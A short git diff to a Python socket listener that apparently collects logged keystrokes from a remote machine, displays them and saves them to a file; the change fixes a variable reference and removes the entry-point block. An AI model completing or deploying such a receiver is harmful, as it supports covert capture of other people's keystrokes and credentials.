@@ -22,6 +22,8 @@ class live_recever():
                     os.system("clear")
             except KeyboardInterrupt:
                 exit(1)
+
+
     def backup(self,keys,OUTPUT_FILE_NAME):
         f = open(OUTPUT_FILE_NAME, "w")
         f.write(keys)
@@ -51,15 +53,13 @@ class live_recever():
 
         display = threading.Thread(target = self.display)
         display.start()
-        #backup = Process(target = self.backup)
-        #backup.start()
+
         while True:
             try:
                 self.keys += socket_recever.recv(999).decode("utf-8")
-                self.backup(keys,OUTPUT_FILE_NAME)
+                self.backup(self.keys,OUTPUT_FILE_NAME)
             except :
                 tries +=1
 
-if __name__ == "__main__":
-    freeze_support()
-    live_recever1 = live_recever()
+
+    
